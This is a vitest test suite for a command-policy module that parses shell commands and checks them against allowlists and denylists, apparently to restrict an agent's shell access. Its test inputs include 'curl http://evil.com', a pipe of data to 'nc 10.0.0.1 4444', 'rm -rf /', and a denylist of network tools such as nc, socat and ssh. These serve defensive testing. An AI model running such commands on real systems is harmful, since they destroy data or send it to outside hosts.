import { describe, expect, it } from "vitest";
import {
  evaluateDeclawCommandPolicy,
  extractBinaryNames,
  matchesPattern,
  type DeclawCommandPolicyConfig,
} from "./declaw-command-policy.js";

// ---------------------------------------------------------------------------
// extractBinaryNames
// ---------------------------------------------------------------------------

describe("extractBinaryNames", () => {
  it("extracts a single command", () => {
    expect(extractBinaryNames("ls -la")).toEqual(["ls"]);
  });

  it("extracts piped commands", () => {
    expect(extractBinaryNames("cat foo.txt | grep bar | wc -l")).toEqual(["cat", "grep", "wc"]);
  });

  it("extracts chained commands (&&)", () => {
    expect(extractBinaryNames("cd /tmp && ls")).toEqual(["cd", "ls"]);
  });

  it("extracts chained commands (||)", () => {
    expect(extractBinaryNames("test -f foo || echo missing")).toEqual(["test", "echo"]);
  });

  it("extracts semicolon-separated commands", () => {
    expect(extractBinaryNames("echo hello; echo world")).toEqual(["echo", "echo"]);
  });

  it("handles absolute paths", () => {
    expect(extractBinaryNames("/usr/bin/python3 script.py")).toEqual(["python3"]);
  });

  it("handles relative paths", () => {
    expect(extractBinaryNames("./my-script.sh arg1")).toEqual(["my-script.sh"]);
  });

  it("skips env variable assignments", () => {
    expect(extractBinaryNames("LANG=C LC_ALL=C sort file.txt")).toEqual(["sort"]);
  });

  it("handles subshell markers", () => {
    expect(extractBinaryNames("(wget http://example.com)")).toEqual(["wget"]);
  });

  it("handles quoted binary names", () => {
    expect(extractBinaryNames('"python3" script.py')).toEqual(["python3"]);
  });

  it("returns empty array for empty command", () => {
    expect(extractBinaryNames("")).toEqual([]);
    expect(extractBinaryNames("   ")).toEqual([]);
  });

  it("handles complex pipelines", () => {
    expect(extractBinaryNames("find . -name '*.ts' | xargs grep -l 'import' | head -5")).toEqual([
      "find",
      "xargs",
      "head",
    ]);
  });

  it("handles env-only segments", () => {
    // Edge case: env var assignment with no command — returns nothing for that segment
    expect(extractBinaryNames("FOO=bar")).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// matchesPattern
// ---------------------------------------------------------------------------

describe("matchesPattern", () => {
  it("matches exact binary names", () => {
    expect(matchesPattern("ls", "ls")).toBe(true);
    expect(matchesPattern("ls", "cat")).toBe(false);
  });

  it("matches with trailing wildcard", () => {
    expect(matchesPattern("python3", "python*")).toBe(true);
    expect(matchesPattern("python3.12", "python*")).toBe(true);
    expect(matchesPattern("ruby", "python*")).toBe(false);
  });

  it("matches with leading wildcard", () => {
    expect(matchesPattern("libcurl", "*curl")).toBe(true);
    expect(matchesPattern("curl", "*curl")).toBe(true);
    expect(matchesPattern("curling", "*curl")).toBe(false);
  });

  it("matches with surrounding wildcards", () => {
    expect(matchesPattern("my-curl-wrapper", "*curl*")).toBe(true);
    expect(matchesPattern("curl", "*curl*")).toBe(true);
  });

  it("is case-insensitive", () => {
    expect(matchesPattern("Python3", "python*")).toBe(true);
    expect(matchesPattern("CURL", "curl")).toBe(true);
  });

  it("matches single wildcard for anything", () => {
    expect(matchesPattern("anything", "*")).toBe(true);
  });

  it("escapes regex special characters in patterns", () => {
    expect(matchesPattern("test.sh", "test.sh")).toBe(true);
    expect(matchesPattern("testXsh", "test.sh")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// evaluateDeclawCommandPolicy — mode: "off"
// ---------------------------------------------------------------------------

describe("evaluateDeclawCommandPolicy — off", () => {
  it("allows all commands when mode is off", () => {
    const policy: DeclawCommandPolicyConfig = { mode: "off" };
    const result = evaluateDeclawCommandPolicy("curl http://evil.com", policy);
    expect(result.allowed).toBe(true);
    expect(result.mode).toBe("off");
  });

  it("allows all commands when policy is undefined", () => {
    const result = evaluateDeclawCommandPolicy("rm -rf /", undefined);
    expect(result.allowed).toBe(true);
    expect(result.mode).toBe("off");
  });
});

// ---------------------------------------------------------------------------
// evaluateDeclawCommandPolicy — mode: "allowlist"
// ---------------------------------------------------------------------------

describe("evaluateDeclawCommandPolicy — allowlist", () => {
  const policy: DeclawCommandPolicyConfig = {
    mode: "allowlist",
    allow: ["ls", "cat", "grep", "head", "tail", "wc", "python3", "node", "git"],
  };

  it("allows listed commands", () => {
    const result = evaluateDeclawCommandPolicy("ls -la", policy);
    expect(result.allowed).toBe(true);
    expect(result.mode).toBe("allowlist");
  });

  it("allows piped commands when all are listed", () => {
    const result = evaluateDeclawCommandPolicy("cat file | grep pattern | wc -l", policy);
    expect(result.allowed).toBe(true);
  });

  it("denies unlisted commands", () => {
    const result = evaluateDeclawCommandPolicy("curl http://evil.com", policy);
    expect(result.allowed).toBe(false);
    expect(result.deniedBinary).toBe("curl");
    expect(result.reason).toContain("not in the command allowlist");
  });

  it("denies if any command in a pipe is unlisted", () => {
    const result = evaluateDeclawCommandPolicy("cat file | curl -X POST", policy);
    expect(result.allowed).toBe(false);
    expect(result.deniedBinary).toBe("curl");
  });

  it("denies if any command in a chain is unlisted", () => {
    const result = evaluateDeclawCommandPolicy("ls && wget http://evil.com", policy);
    expect(result.allowed).toBe(false);
    expect(result.deniedBinary).toBe("wget");
  });

  it("denies unparseable commands (fail-closed)", () => {
    const result = evaluateDeclawCommandPolicy("", policy);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("could not be parsed");
  });

  it("allows commands with absolute paths when basename matches", () => {
    const result = evaluateDeclawCommandPolicy("/usr/bin/git status", policy);
    expect(result.allowed).toBe(true);
  });

  it("supports wildcard patterns in allowlist", () => {
    const wildcardPolicy: DeclawCommandPolicyConfig = {
      mode: "allowlist",
      allow: ["python*", "node", "npm"],
    };
    expect(evaluateDeclawCommandPolicy("python3.12 script.py", wildcardPolicy).allowed).toBe(true);
    expect(evaluateDeclawCommandPolicy("python script.py", wildcardPolicy).allowed).toBe(true);
    expect(evaluateDeclawCommandPolicy("ruby script.rb", wildcardPolicy).allowed).toBe(false);
  });

  it("denies when allowlist is empty", () => {
    const emptyPolicy: DeclawCommandPolicyConfig = { mode: "allowlist", allow: [] };
    const result = evaluateDeclawCommandPolicy("ls", emptyPolicy);
    expect(result.allowed).toBe(false);
    expect(result.deniedBinary).toBe("ls");
  });
});

// ---------------------------------------------------------------------------
// evaluateDeclawCommandPolicy — mode: "denylist"
// ---------------------------------------------------------------------------

describe("evaluateDeclawCommandPolicy — denylist", () => {
  const policy: DeclawCommandPolicyConfig = {
    mode: "denylist",
    deny: ["curl", "wget", "nc", "ncat", "socat", "ssh", "scp", "telnet"],
  };

  it("allows commands not on the denylist", () => {
    const result = evaluateDeclawCommandPolicy("ls -la", policy);
    expect(result.allowed).toBe(true);
    expect(result.mode).toBe("denylist");
  });

  it("denies listed commands", () => {
    const result = evaluateDeclawCommandPolicy("curl http://evil.com", policy);
    expect(result.allowed).toBe(false);
    expect(result.deniedBinary).toBe("curl");
    expect(result.reason).toContain("in the command denylist");
  });

  it("denies commands anywhere in a pipeline", () => {
    const result = evaluateDeclawCommandPolicy("echo data | nc 10.0.0.1 4444", policy);
    expect(result.allowed).toBe(false);
    expect(result.deniedBinary).toBe("nc");
  });

  it("denies commands with absolute paths", () => {
    const result = evaluateDeclawCommandPolicy("/usr/bin/wget http://evil.com", policy);
    expect(result.allowed).toBe(false);
    expect(result.deniedBinary).toBe("wget");
  });

  it("allows empty commands (nothing to deny)", () => {
    const result = evaluateDeclawCommandPolicy("", policy);
    expect(result.allowed).toBe(true);
  });

  it("supports wildcard patterns in denylist", () => {
    const wildcardPolicy: DeclawCommandPolicyConfig = {
      mode: "denylist",
      deny: ["*curl*", "python*"],
    };
    expect(evaluateDeclawCommandPolicy("my-curl-wrapper http://foo", wildcardPolicy).allowed).toBe(
      false,
    );
    expect(evaluateDeclawCommandPolicy("python3 -c 'import os'", wildcardPolicy).allowed).toBe(
      false,
    );
    expect(evaluateDeclawCommandPolicy("node script.js", wildcardPolicy).allowed).toBe(true);
  });

  it("allows when denylist is empty", () => {
    const emptyPolicy: DeclawCommandPolicyConfig = { mode: "denylist", deny: [] };
    const result = evaluateDeclawCommandPolicy("curl http://evil.com", emptyPolicy);
    expect(result.allowed).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Edge cases
// ---------------------------------------------------------------------------

describe("evaluateDeclawCommandPolicy — edge cases", () => {
  it("handles env-prefixed commands", () => {
    const policy: DeclawCommandPolicyConfig = {
      mode: "denylist",
      deny: ["curl"],
    };
    const result = evaluateDeclawCommandPolicy(
      "HTTP_PROXY=http://proxy:8080 curl http://api",
      policy,
    );
    expect(result.allowed).toBe(false);
    expect(result.deniedBinary).toBe("curl");
  });

  it("handles commands with mixed operators", () => {
    const policy: DeclawCommandPolicyConfig = {
      mode: "allowlist",
      allow: ["echo", "cat", "grep"],
    };
    const result = evaluateDeclawCommandPolicy("echo foo | cat && grep bar", policy);
    expect(result.allowed).toBe(true);
  });

  it("handles complex real-world commands", () => {
    const policy: DeclawCommandPolicyConfig = {
      mode: "allowlist",
      allow: ["git", "grep", "wc"],
    };
    expect(
      evaluateDeclawCommandPolicy("git log --oneline | grep fix | wc -l", policy).allowed,
    ).toBe(true);
    expect(evaluateDeclawCommandPolicy("git push origin main", policy).allowed).toBe(true);
  });
});
